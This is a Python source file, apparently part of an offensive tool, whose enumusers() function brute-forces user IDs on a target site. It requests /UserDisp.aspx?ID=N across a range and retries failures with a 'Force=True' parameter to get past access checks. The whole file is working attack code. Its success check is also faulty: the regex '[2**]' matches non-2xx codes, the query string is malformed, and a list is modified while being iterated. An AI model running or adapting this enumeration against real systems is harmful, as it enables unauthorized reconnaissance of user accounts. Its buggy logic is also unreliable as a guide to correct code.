import re
import requests
import url_processor
import logging
import sys

__author__ = '0rigen'
__email__ = "0rigen@0rigen.net"
__status__ = "Prototype"


# TODO:
# This checks for successful web requests, but will likely need to actually read the page
# and identify if valid data was returned or not.  It may just return a 'successful' but blank
# page if permissions are properly set.

####################################
#      enumusers()                 #
# @start - Integer starting value  #
# @end - Integer ending value      #
####################################
def enumusers(target, start=None, end=None):
    results = []                                                            # Results Container
    failures = []                                                           # Failure Container to retry with Force

    if start is None:                                                       # Assign default Start and End values
        start = 1
        sys.stdout.write("[!] No start value provided, starting at UID=%d" % start)
        sys.stdout.write("\n")
    if end is None:
        end = 10
        sys.stdout.write("[!] No stop value provided, stopping at UID=%d" % end)
        sys.stdout.write("\n")

    # Ensure proper target specification
    target = url_processor.checkhttp(target)                                # Check traget formatting

    # Begin requesting pages
    for i in range(start, end):                                            # From start to end...

        r = target + "/UserDisp.aspx?ID=" + str(i)                          # Compiled request string
        sys.stdout.write("\r[...] Trying UserID = %d" % i)

        try:
            page = requests.get(r)                                          # Open the page
            code_match = re.search("[2**]", str(page.status_code))          # Check for success code 2xx
            if code_match is not None:
                results.append(i)                                           # Add to results if successful
                sys.stdout.flush()
            else:
                failures.append(i)                                          # Add to Failures to retry with Force
                sys.stdout.flush()
        except:                                                             # Handle things that go badly...
            sys.stdout.write("\n[X] Unexpected Error in enumusers()\n")

    sys.stdout.write("\n[!] Attempting failed IDs with the Force parameter set to True...")
    sys.stdout.write("\n")

    for user in failures:

        r = target + "/UserDisp.aspx?ID=" + str(user) + "?Force=True"        # Request string with True parameter
        sys.stdout.write("\r[...] Retrying UserID = %d" % user)

        try:
            page = requests.get(r)                                          # Open the page
            code_match = re.search("[2**]", str(page.status_code))          # Check for success code 2xx
            if code_match is not None:
                results.append(user)                               # Add to results if successful, remove from Failures
                failures.remove(user)
            else:
                pass
        except:                                                             # Handle things that go badly...
            sys.stdout.write("\n[X] Unexpected Error in enumusers(), failures loop")

        sys.stdout.flush()

    logging.info("UserID Brute Force Completed.")
    sys.stdout.write("\n")

    if len(results) == 0:
        print("[*] No users found")
    else:
        sys.stdout.write("[*] Found a user")

    return results                                                          # Return array of successful IDs
